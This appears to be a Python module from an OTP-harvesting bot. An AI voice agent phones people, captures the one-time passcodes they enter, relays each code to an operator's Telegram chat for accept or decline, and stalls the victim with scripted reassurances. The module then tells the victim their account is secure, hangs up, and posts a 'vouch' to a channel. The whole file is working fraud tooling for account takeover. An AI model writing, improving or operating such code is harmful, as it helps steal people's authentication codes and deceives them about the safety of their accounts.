import logging
import threading
from typing import Optional

from telebot import types

logger = logging.getLogger(__name__)

_bot_instance = None


def init_bot(bot):
    global _bot_instance
    _bot_instance = bot


def notify_otp_captured(
    chat_id: int,
    call_sid: str,
    digits: str,
    user_id: str = "unknown",
    vapi_call_id: Optional[str] = None,
):
    from bot import send_call_stage_status, store_otp_timer, get_call_session, register_call_session, get_call_voice_info, post_vouch_to_channel, log_otp
    from services.vapi_service import end_call as vapi_end_call

    session = get_call_session(call_sid)
    if session is None and vapi_call_id:
        session = get_call_session(vapi_call_id)
    if session is None:
        session = register_call_session(call_sid)
    if session is not None:
        session["otp"] = digits
        session["otp_status"] = "pending"
        session["otp_attempts"] = 0
        if vapi_call_id:
            session["vapi_call_id"] = vapi_call_id

    if chat_id and digits:
        send_call_stage_status(chat_id, "CAPTURE_OTP", f"🔐 Code received: {digits}")
        buttons = types.InlineKeyboardMarkup()
        buttons.add(
            types.InlineKeyboardButton("✅ ACCEPT", callback_data=f"otp_accept_{call_sid}_{digits}"),
            types.InlineKeyboardButton("❌ DECLINE", callback_data=f"otp_decline_{call_sid}_{digits}"),
        )
        if _bot_instance is None:
            logger.error("[OTP] _bot_instance is None — cannot send OTP notification to Telegram")
        else:
            try:
                _bot_instance.send_message(
                    chat_id,
                    "🔐 *OTP Captured*\n\n"
                    f"Code: `{digits}`\n\n"
                    "Press ✅ to accept and complete the call, or ❌ to decline and retry. "
                    "If no action is taken within 30 seconds, the code will be auto-accepted and the call will end.",
                    reply_markup=buttons,
                    parse_mode="Markdown",
                )
            except Exception as e:
                logger.error(f"[OTP] Failed to send OTP message to chat {chat_id}: {e}")

    log_otp(call_sid, digits, status="captured")

    def _hold_assistant(vapi_id):
        """Speak a short hold line, then fall silent while the Telegram user
        decides on ACCEPT/DECLINE. Uses 3-step paced pacing (t0 / ~10s / ~20s)
        so the caller is never left on dead air, then the 30s auto-accept
        finishes the call. The resume lines are spoken on accept/decline."""
        def _say(line):
            try:
                from services.vapi_service import say_to_assistant
                if session and session.get("otp_status") == "pending":
                    say_to_assistant(vapi_id, line)
            except Exception as e:
                logger.debug(f"Vapi hold say failed: {e}")

        import time
        _say("One moment, I need to verify this code.")
        session_id = vapi_call_id or call_sid
        # 2nd step (≈10s): brief re-assurance the call is active.
        time.sleep(10)
        if session and session.get("otp_status") == "pending":
            _say("Still verifying, one second.")
            # 3rd step (≈20s): last human touch just before auto-accept.
            time.sleep(10)
            if session and session.get("otp_status") == "pending":
                _say("Almost done, thank you.")
        if session and session.get("otp_status") == "pending":
            session["otp_hold_active"] = True

    session_id = vapi_call_id or call_sid
    if session_id:
        threading.Thread(target=_hold_assistant, args=(session_id,), daemon=True).start()

    def _end_vapi_call():
        session_local = get_call_session(call_sid)
        if session_local and session_local.get("vapi_call_id"):
            try:
                vapi_end_call(session_local["vapi_call_id"])
            except Exception as e:
                logger.debug(f"Vapi end_call failed: {e}")

    def _auto_accept():
        if not call_sid:
            return
        from bot import get_call_session
        session_local = get_call_session(call_sid)
        if not session_local or session_local.get("otp_status") != "pending":
            return
        try:
            session_local["otp_status"] = "auto_accepted"
            if digits:
                def _post_vouch():
                    post_vouch_to_channel(call_sid, session_local.get("user_id") or user_id, digits, override_mode="Auto Accept")
                threading.Thread(target=_post_vouch, daemon=True).start()
            vapi_id = session_local.get("vapi_call_id") if session_local else None
            if vapi_id:
                from services.vapi_service import say_to_assistant
                import time
                try:
                    say_to_assistant(vapi_id, "Your identity is verified. The account is secure. Goodbye.")
                    time.sleep(2)
                except Exception as e:
                    logger.debug(f"Vapi say on auto-accept: {e}")
            _end_vapi_call()
            if chat_id and _bot_instance:
                try:
                    _bot_instance.send_message(chat_id, "⏳ Auto-accepted after timeout. Call ended successfully.")
                except Exception as e:
                    logger.error(f"[OTP] Auto-accept notification failed: {e}")
        except Exception as e:
            logger.exception(f"Auto-accept failed for CallSid={call_sid}: {e}")

    timer = threading.Timer(30.0, _auto_accept)
    timer.daemon = True
    store_otp_timer(call_sid, timer)
    timer.start()
